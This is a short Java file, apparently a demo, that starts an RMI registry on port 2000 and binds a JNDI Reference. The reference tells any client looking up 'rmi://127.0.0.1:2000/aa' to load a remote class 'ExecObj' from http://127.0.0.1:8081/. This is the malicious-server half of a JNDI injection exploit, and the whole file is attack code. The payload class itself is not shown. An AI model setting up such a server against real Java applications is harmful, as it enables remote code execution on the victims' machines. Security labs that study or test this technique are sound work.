package com.jndi_demo1;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class SERVER {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(2000);
        Reference aa = new Reference("ExecObj", "ExecObj", "http://127.0.0.1:8081/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:2000/aa'");
        registry.bind("aa", refObjWrapper);
    }
}
